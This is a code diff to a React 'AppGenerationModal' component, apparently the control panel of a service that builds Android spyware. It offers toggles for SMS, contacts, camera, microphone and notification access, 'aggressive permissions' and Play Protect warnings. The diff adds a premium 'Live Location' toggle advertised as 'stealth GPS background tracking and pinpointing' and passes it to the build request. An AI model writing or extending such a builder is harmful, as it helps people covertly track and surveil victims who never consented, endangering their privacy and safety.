@@ -242,8 +242,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableStoragePermission, setEnableStoragePermission] = useState(true);
     const [enableCameraPermission, setEnableCameraPermission] = useState(false);
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
+    const [enableLocationPermission, setEnableLocationPermission] = useState(false);
     const [enableNotificationListener, setEnableNotificationListener] = useState(false);
-    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
+    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | null>(null);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
     const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);
@@ -491,6 +492,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableStoragePermission', enableStoragePermission.toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
+            formData.append('enableLocationPermission', enableLocationPermission.toString());
             formData.append('enableNotificationListener', enableNotificationListener.toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             formData.append('notificationStyle', notificationStyle);
@@ -952,6 +954,32 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                    </button>
+                                </div>
+
+                                {/* Live Location - Warm Orange */}
+                                <div className={`p-4 rounded-2xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(249,115,22,0.1)]`}>
+                                    <div className="flex flex-col">
+                                        <div className="flex items-center gap-2">
+                                            <span className="text-sm font-bold text-orange-200">Live Location</span>
+                                            {!isPremium && (
+                                                <Lock size={13} className="text-white/25" />
+                                            )}
+                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-orange-400/70 hover:text-orange-300">
+                                                <Info size={14} />
+                                            </button>
+                                        </div>
+                                        <span className="text-xs text-orange-300/70">Grants stealth GPS background tracking and pinpointing.</span>
+                                    </div>
+                                    <button
+                                        type="button"
+                                        onClick={() => {
+                                            if (!isPremium) { onUpgrade?.('Live Location', 'premium'); return; }
+                                            setEnableLocationPermission(!enableLocationPermission);
+                                        }}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableLocationPermission ? 'bg-orange-500' : 'bg-white/20'}`}
+                                    >
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableLocationPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
